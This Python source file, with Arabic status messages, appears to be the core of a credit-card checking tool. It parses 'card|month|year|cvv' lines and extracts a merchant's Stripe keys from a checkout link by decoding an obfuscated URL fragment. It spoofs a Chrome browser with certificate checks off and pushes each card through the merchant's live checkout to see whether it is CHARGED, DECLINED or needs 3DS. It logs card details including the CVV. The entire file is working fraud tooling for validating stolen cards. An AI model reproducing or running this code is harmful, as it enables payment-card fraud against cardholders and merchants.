# language: Python 3.10+, file: stripe_core.py
import os
import re
import json
import time
import asyncio
from typing import Dict, Optional

class C:
    R = "\033[0m"
    B = "\033[1m"
    RED = "\033[91m"
    LIME = "\033[92m"
    GOLD = "\033[93m"
    CYN = "\033[96m"

def log(msg, color=C.R):
    print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}{C.R}")

def parse_card(text: str) -> Optional[Dict[str, str]]:
    parts = re.split(r'[|/\\\s,]+', text.strip())
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not 15 <= len(cc) <= 19:
        return None
    mm = parts[1].strip().zfill(2)
    if not mm.isdigit() or not 1 <= int(mm) <= 12:
        return None
    yy = parts[2].strip()
    if len(yy) == 2:
        yy = "20" + yy
    if not yy.isdigit() or len(yy) != 4:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if len(cvv) not in (3, 4):
        return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

class StripeSession:
    def __init__(self, target_url: str):
        self.url = target_url.strip()
        self.pk = ""
        self.cs = ""
        self.amount = 100
        self.currency = "USD"
        self.merchant_name = "Stripe Merchant"
        self.session = None

    async def prefetch(self) -> tuple[bool, str]:
        try:
            if "#" in self.url:
                frag = self.url.split("#")[1]
                import base64, urllib.parse
                unquoted = urllib.parse.unquote(frag)
                pad = unquoted + "=" * (-len(unquoted) % 4)
                decoded = base64.b64decode(pad, altchars=b"-_")
                xored = bytes(b ^ 5 for b in decoded).decode("utf-8", errors="ignore")
                j = json.loads(xored)
                self.pk = j.get("apiKey", "")
                self.cs = j.get("checkoutSessionId", "")
            
            if not self.pk or not self.cs:
                m_cs = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+)', self.url)
                m_pk = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]+)', self.url)
                if m_cs: self.cs = m_cs.group(1)
                if m_pk: self.pk = m_pk.group(1)

            if not self.pk or not self.cs:
                return False, "لم يتم العثور على مفاتيح PK أو CS في الرابط."

            import curl_cffi.requests as cffi
            self.session = cffi.AsyncSession(impersonate="chrome131", verify=False)
            
            r = await self.session.get(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                params={"key": self.pk},
                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
                timeout=12
            )
            if r.status_code != 200:
                return False, f"فشل الاتصال بـ Stripe API (HTTP {r.status_code})"
                
            data = r.json() or {}
            pi = data.get("payment_intent") or {}
            due = (data.get("total_summary") or {}).get("due") or (data.get("invoice") or {}).get("amount_due")
            self.amount = int(due or pi.get("amount") or 100)
            self.currency = str(data.get("currency") or pi.get("currency") or "USD").upper()
            
            acct = data.get("account_settings") or {}
            if acct.get("display_name"):
                self.merchant_name = acct["display_name"]
                
            return True, ""
        except Exception as e:
            return False, str(e)

    async def charge(self, card_dict: dict) -> dict:
        t0 = time.time()
        cc = card_dict["cc"]
        mm = card_dict["mm"]
        yy = card_dict["yy"]
        cvv = card_dict["cvv"]

        try:
            r_page = await self.session.get(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                params={"key": self.pk},
                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
                timeout=12
            )
            page_data = r_page.json() or {}
            pi_obj = page_data.get("payment_intent") or {}
            pi_id = pi_obj.get("id")
            pi_client_secret = pi_obj.get("client_secret")

            tok_body = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": "10001",
                "key": self.pk,
                "payment_user_agent": "stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; checkout"
            }
            
            r_tok = await self.session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=tok_body,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
                timeout=12
            )
            td = r_tok.json() or {}
            pm_id = td.get("id")
            
            if not pm_id:
                err = td.get("error", {})
                return {
                    "status": "DECLINED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": err.get("message", "Card Declined")
                }

            if pi_id and pi_client_secret:
                conf_pi_body = {
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "use_stripe_sdk": "true",
                    "key": self.pk,
                    "client_secret": pi_client_secret
                }
                r_conf = await self.session.post(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                    data=conf_pi_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
                    timeout=20
                )
            else:
                confirm_body = {
                    "key": self.pk,
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "expected_amount": str(self.amount),
                    "return_url": self.url.split("#")[0],
                    "client_attribution_metadata[client_session_id]": self.cs,
                }
                r_conf = await self.session.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                    data=confirm_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
                    timeout=20
                )

            resp = r_conf.json() or {}
            err = resp.get("error") or {}
            if err:
                return {
                    "status": "DECLINED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": err.get("message", "Declined")
                }

            pi = resp.get("payment_intent") or resp.get("setup_intent") or resp or {}
            pi_status = str(pi.get("status") or "")

            if pi_status in ("succeeded", "complete", "requires_capture"):
                return {
                    "status": "CHARGED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": "تم خصم المبلغ بنجاح ✅"
                }
            elif pi_status == "requires_action" or pi.get("next_action"):
                return {
                    "status": "REQUIRES_ACTION",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": "تتطلب مصادقة 3DS / OTP 🔐"
                }
            else:
                return {
                    "status": "DECLINED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": f"الرد: {pi_status or 'Declined'}"
                }

        except Exception as e:
            return {
                "status": "ERROR",
                "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                "amount": f"{self.currency} {self.amount/100:.2f}",
                "response_time": time.time() - t0,
                "message": str(e)[:100]
            }

    async def close(self):
        if self.session:
            try:
                await self.session.close()
            except:
                pass
